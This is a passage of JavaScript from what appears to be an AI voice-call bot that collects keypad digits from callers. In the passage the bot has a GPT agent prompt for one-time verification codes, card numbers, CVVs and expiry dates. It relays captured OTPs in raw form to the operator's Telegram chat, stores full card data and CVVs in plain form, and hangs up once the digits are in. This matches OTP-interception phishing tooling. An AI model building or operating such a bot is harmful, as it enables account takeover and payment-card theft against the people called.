        partialResponseIndex: null,
        partialResponse: instruction,
        personalityInfo: gptService.personalityEngine?.getCurrentPersonality() || {},
        adaptationHistory: gptService.personalityChanges?.slice(-3) || []
      }, interactionCount);
      markDigitPrompted(callSid);
    }
    await recordFirstTurnDecision(callSid, { ...decision, confidence: decision.confidence || 0.8 });
    return payload;
  }

  async function startNextDigitPlanStep(callSid, plan, gptService = null, interactionCount = 0) {
    if (!plan || !Array.isArray(plan.steps) || plan.index >= plan.steps.length) return;
    const step = plan.steps[plan.index];
    const callConfig = callConfigurations.get(callSid);
    const promptHint = [callConfig?.first_message, callConfig?.prompt]
      .filter(Boolean)
      .join(' ');
    const payload = normalizeDigitExpectation({ ...step, prompt: '', prompt_hint: promptHint });
    payload.plan_id = plan.id;
    payload.plan_step_index = plan.index + 1;
    payload.plan_total_steps = plan.steps.length;

    digitCollectionManager.setExpectation(callSid, payload);
    if (typeof clearSilenceTimer === 'function') {
      clearSilenceTimer(callSid);
    }
    if (gptService) {
      scheduleDigitTimeout(callSid, gptService, interactionCount);
    }

    try {
      await db.updateCallState(callSid, 'digit_collection_requested', payload);
    } catch (err) {
      logger.error('digit plan step updateCallState error:', err);
    }

    const stepLabel = payload.profile || 'digits';
    webhookService.addLiveEvent(callSid, `🔢 Collect digits (${stepLabel}) step ${payload.plan_step_index}/${payload.plan_total_steps}`, { force: true });

    if (gptService) {
      const spokenPrompt = callConfig?.first_message || callConfig?.prompt || 'Please enter the digits now.';
      const instruction = payload.plan_total_steps
        ? `Step ${payload.plan_step_index} of ${payload.plan_total_steps}. ${spokenPrompt}`
        : spokenPrompt;
      gptService.emit('gptreply', {
        partialResponseIndex: null,
        partialResponse: instruction,
        personalityInfo: gptService.personalityEngine.getCurrentPersonality(),
        adaptationHistory: gptService.personalityChanges?.slice(-3) || []
      }, interactionCount);
      try {
        gptService.updateUserContext('digit_collection_plan', 'system', `Digit plan step ${payload.plan_step_index}/${payload.plan_total_steps} (${payload.profile})`);
      } catch (_) {}
      markDigitPrompted(callSid);
    }
  }

  async function requestDigitCollection(callSid, args = {}, gptService = null) {
    if (digitCollectionPlans.has(callSid)) {
      clearDigitPlan(callSid);
    }
    const callConfig = callConfigurations.get(callSid);
    const promptHint = [callConfig?.first_message, callConfig?.prompt]
      .filter(Boolean)
      .join(' ');
    const payload = normalizeDigitExpectation({ ...args, prompt: '', prompt_hint: promptHint });
    try {
      await db.updateCallState(callSid, 'digit_collection_requested', payload);
      webhookService.addLiveEvent(callSid, `🔢 Collect digits (${payload.profile}): ${payload.min_digits}-${payload.max_digits}`, { force: true });
      digitCollectionManager.setExpectation(callSid, payload);
      if (typeof clearSilenceTimer === 'function') {
        clearSilenceTimer(callSid);
      }
      scheduleDigitTimeout(callSid, gptService, 0);
      if (gptService) {
        const spokenPrompt = callConfig?.first_message || callConfig?.prompt || `Please enter the ${payload.min_digits}-${payload.max_digits} digit code using your keypad now.`;
        const instruction = spokenPrompt;
        const reply = {
          partialResponseIndex: null,
          partialResponse: instruction,
          personalityInfo: gptService.personalityEngine.getCurrentPersonality(),
          adaptationHistory: gptService.personalityChanges?.slice(-3) || []
        };
        gptService.emit('gptreply', reply, 0);
        gptService.updateUserContext('digit_collection', 'system', `Collect digits requested (${payload.profile}): expecting ${payload.min_digits}-${payload.max_digits} digits.`);
        markDigitPrompted(callSid);
      }
    } catch (err) {
      logger.error('collect_digits handler error:', err);
    }
    return payload;
  }

  async function requestDigitCollectionPlan(callSid, args = {}, gptService = null) {
    const steps = Array.isArray(args.steps) ? args.steps : [];
    if (!steps.length) {
      return { error: 'No steps provided' };
    }

    if (digitCollectionPlans.has(callSid)) {
      clearDigitPlan(callSid);
    }
    digitCollectionManager.expectations.delete(callSid);
    clearDigitTimeout(callSid);
    clearDigitFallbackState(callSid);

    const plan = {
      id: `plan_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`,
      steps,
      index: 0,
      active: true,
      created_at: new Date().toISOString()
    };

    digitCollectionPlans.set(callSid, plan);
    await db.updateCallState(callSid, 'digit_collection_plan_started', {
      steps: steps.map((step) => step.profile || 'generic'),
      total_steps: steps.length
    }).catch(() => {});

    await startNextDigitPlanStep(callSid, plan, gptService, 0);
    return { status: 'started', steps: steps.length };
  }

  async function handleCollectionResult(callSid, collection, gptService = null, interactionCount = 0, source = 'dtmf', options = {}) {
    if (!collection) return;
    const allowCallEnd = options.allowCallEnd === true;
    const expectation = digitCollectionManager.expectations.get(callSid);
    const expectedLabel = expectation ? buildExpectedLabel(expectation) : 'the code';
    const payload = {
      profile: collection.profile,
      raw_digits: collection.digits,
      masked: collection.masked,
      len: collection.len,
      route: collection.route || null,
      accepted: !!collection.accepted,
      retries: collection.retries || 0,
      fallback: !!collection.fallback,
      reason: collection.reason || null,
      heuristic: collection.heuristic || null
    };

    try {
      await db.updateCallState(callSid, 'digits_collected', {
        ...payload,
        masked_last4: collection.masked
      });
      await db.addCallDigitEvent({
        call_sid: callSid,
        source,
        profile: collection.profile,
        digits: collection.digits,
        len: collection.len,
        accepted: collection.accepted,
        reason: collection.reason,
        metadata: {
          masked: collection.masked,
          route: collection.route || null,
          heuristic: collection.heuristic || null
        }
      });
    } catch (err) {
      logger.error('Error logging digits_collected:', err);
    }

    const liveMasked = maskDigitsForPreview(collection.digits || collection.masked || '');
    const liveLabel = labelForProfile(collection.profile);
    if (collection.reason === 'incomplete') {
      const progressMax = expectation?.max_digits || '';
      const progress = progressMax ? ` (${collection.len}/${progressMax})` : '';
      webhookService.addLiveEvent(callSid, `🔢 ${liveLabel} progress: ${liveMasked}${progress}`, { force: true });
    } else if (collection.accepted) {
      webhookService.addLiveEvent(callSid, `✅ ${liveLabel} captured: ${liveMasked}`, { force: true });
    } else {
      const hint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
      webhookService.addLiveEvent(callSid, `⚠️ ${liveLabel} invalid${hint}: ${liveMasked}`, { force: true });
    }

    if (!collection.accepted && collection.reason === 'incomplete') {
      if (collection.profile === 'verification') {
        const progress = formatOtpForDisplay(collection.digits, 'progress');
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
      }
      scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
      return;
    }

    const personalityInfo = gptService?.personalityEngine?.getCurrentPersonality();
    const emitReply = (text) => {
      if (!gptService || !text) return;
      const reply = {
        partialResponseIndex: null,
        partialResponse: text,
        personalityInfo,
        adaptationHistory: gptService.personalityChanges?.slice(-3) || []
      };
      gptService.emit('gptreply', reply, interactionCount);
      try {
        gptService.updateUserContext('system', 'system', `Digit handling note: ${text}`);
      } catch (_) {}
    };

    if (collection.accepted) {
      clearDigitTimeout(callSid);
      clearDigitFallbackState(callSid);
      digitCollectionManager.expectations.delete(callSid);
      switch (collection.profile) {
        case 'menu':
        case 'extension':
          if (collection.route) {
            webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
            await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
          }
          break;
        case 'account':
        case 'zip':
        case 'verification':
          webhookService.addLiveEvent(callSid, `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`, { force: true });
          await db.updateCallState(callSid, 'identity_confirmed', {
            method: 'digits',
            note: `${collection.profile} digits confirmed (masked)`,
            masked: collection.masked
          }).catch(() => {});
          await db.updateCallStatus(callSid, 'in-progress', {
            last_otp: collection.digits,
            last_otp_masked: collection.masked
          }).catch(() => {});
          {
            const cfg = callConfigurations.get(callSid);
            if (cfg?.user_chat_id) {
              const msg = `🔐 OTP received for call ${callSid.slice(-6)}: ${collection.digits}`;
              webhookService.sendTelegramMessage(cfg.user_chat_id, msg).catch(() => {});
            }
          }
          await db.updateCallState(callSid, 'otp_captured', {
            masked: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'amount': {
          const amountCents = Number(collection.digits);
          const dollars = (amountCents / 100).toFixed(2);
          webhookService.addLiveEvent(callSid, `💵 Amount entered: $${dollars}`, { force: true });
          await db.updateCallState(callSid, 'amount_captured', {
            amount_cents: amountCents,
            amount_display: `$${dollars}`
          }).catch(() => {});
          break;
        }
        case 'survey':
          webhookService.addLiveEvent(callSid, `📝 Survey response: ${collection.digits}`, { force: true });
          await db.updateCallState(callSid, 'survey_response', { rating: collection.digits }).catch(() => {});
          break;
        case 'callback_confirm':
          webhookService.addLiveEvent(callSid, `📞 Callback number confirmed (ending ${collection.masked.slice(-4)})`, { force: true });
          await db.updateCallState(callSid, 'callback_confirmed', {
            masked_last4: collection.masked,
            raw_digits: collection.digits
          }).catch(() => {});
          break;
        case 'card_number':
          webhookService.addLiveEvent(callSid, `💳 Card number captured (${collection.len})`, { force: true });
          await db.updateCallState(callSid, 'card_number_captured', {
            card_number: collection.digits,
            last4: collection.digits ? collection.digits.slice(-4) : null
          }).catch(() => {});
          break;
        case 'cvv':
          webhookService.addLiveEvent(callSid, `🔐 CVV captured (${collection.len})`, { force: true });
          await db.updateCallState(callSid, 'cvv_captured', {
            cvv: collection.digits
          }).catch(() => {});
          break;
        case 'card_expiry':
          webhookService.addLiveEvent(callSid, `📅 Expiry captured (${collection.digits})`, { force: true });
          await db.updateCallState(callSid, 'card_expiry_captured', {
            expiry: collection.digits
          }).catch(() => {});
          break;
        default:
          webhookService.addLiveEvent(callSid, `🔢 Digits captured (${collection.len})`, { force: true });
      }
      const planId = expectation?.plan_id;
      if (planId && digitCollectionPlans.has(callSid)) {
        const plan = digitCollectionPlans.get(callSid);
        if (plan?.id === planId && plan.active) {
          plan.index += 1;
          if (plan.index < plan.steps.length) {
            await startNextDigitPlanStep(callSid, plan, gptService, interactionCount + 1);
            return;
          }
          plan.active = false;
          digitCollectionPlans.delete(callSid);
          webhookService.addLiveEvent(callSid, '✅ Digit collection plan completed', { force: true });
          await db.updateCallState(callSid, 'digit_collection_plan_completed', {
            steps: plan.steps.length,
            completed_at: new Date().toISOString()
          }).catch(() => {});
          await speakAndEndCall(callSid, closingMessage, 'digits_collected_plan');
          return;
        }
      }

      // Single-step: always end the call after digits captured
      await speakAndEndCall(callSid, closingMessage, collection.profile === 'verification' ? 'otp_verified' : 'digits_collected');
      return;
    } else {
      const reasonHint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
      webhookService.addLiveEvent(callSid, `⚠️ Invalid digits (${collection.len})${reasonHint}; retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`, { force: true });
      if (collection.fallback) {
        const failureMessage = expectation?.failure_message || callEndMessages.failure || 'I could not verify the digits. Thank you for your time.';
        const fallbackMsg = fallbackToVoiceOnFailure
          ? 'I could not verify the digits. I will continue the call without keypad entry.'
          : failureMessage;
        webhookService.addLiveEvent(callSid, `⏳ No valid digits; ${fallbackToVoiceOnFailure ? 'switching to voice' : 'ending call'}`, { force: true });
        digitCollectionManager.expectations.delete(callSid);
        clearDigitTimeout(callSid);
        clearDigitFallbackState(callSid);
        clearDigitPlan(callSid);
        if (fallbackToVoiceOnFailure) {
          emitReply(fallbackMsg);
          return;
        }
        if (allowCallEnd) {
          await speakAndEndCall(callSid, failureMessage, 'digit_collection_failed');
          return;
        }
        emitReply(fallbackMsg);
      } else {
        let prompt = '';
        if (collection.reason === 'too_fast') {
          prompt = 'That was too fast. Please enter the digits again slowly.';
        } else if (collection.reason === 'spam_pattern') {
          prompt = 'That pattern did not look right. Please enter the correct digits now.';
        } else if (collection.reason === 'too_short') {
          prompt = chooseReprompt(expectation || {}, 'incomplete', collection.retries || 1)
            || `Please enter the ${expectedLabel} now.`;
        } else {
          prompt = chooseReprompt(expectation || {}, 'invalid', collection.retries || 1)
            || `Please enter the ${expectedLabel} now.`;
        }
        emitReply(prompt);
        if (gptService) {
          scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
        }
      }
    }

    const summary = collection.accepted
      ? collection.route
        ? `✅ Digits accepted • routed: ${collection.route}`
        : collection.profile === 'verification'
          ? `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`
          : `✅ Digits accepted (${collection.len})`
      : collection.fallback
        ? '⚠️ Digits failed after retries'
        : `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`;
    webhookService.addLiveEvent(callSid, summary, { force: true });
  }

  function clearCallState(callSid) {
    digitCollectionManager.expectations.delete(callSid);
    clearDigitTimeout(callSid);
    clearDigitFallbackState(callSid);
    clearDigitPlan(callSid);
    lastDtmfTimestamps.delete(callSid);
  }

  return {
    expectations: digitCollectionManager.expectations,
    buildDigitPrompt,
    buildTwilioGatherTwiml,
    clearCallState,
    clearDigitFallbackState,
    clearDigitPlan,
    clearDigitTimeout,
    determineDigitIntent,
    formatDigitsGeneral,
    formatOtpForDisplay,
    getExpectation: (callSid) => digitCollectionManager.expectations.get(callSid),
    getOtpContext,
    handleCollectionResult,
    hasExpectation: (callSid) => digitCollectionManager.expectations.has(callSid),
    inferDigitExpectationFromText,
    markDigitPrompted,
    maskOtpForExternal,
    maybeStartFirstTurnCollection,
    normalizeDigitExpectation,
    prepareInitialExpectation,
    recordDigits: (callSid, digits, meta) => digitCollectionManager.recordDigits(callSid, digits, meta),
    requestDigitCollection,
    requestDigitCollectionPlan,
    scheduleDigitTimeout,
    setExpectation: (callSid, params) => digitCollectionManager.setExpectation(callSid, params),
    isFallbackActive: (callSid) => digitFallbackStates.get(callSid)?.active === true,
    hasPlan: (callSid) => digitCollectionPlans.has(callSid)
  };
}

module.exports = {
  createDigitCollectionService
};
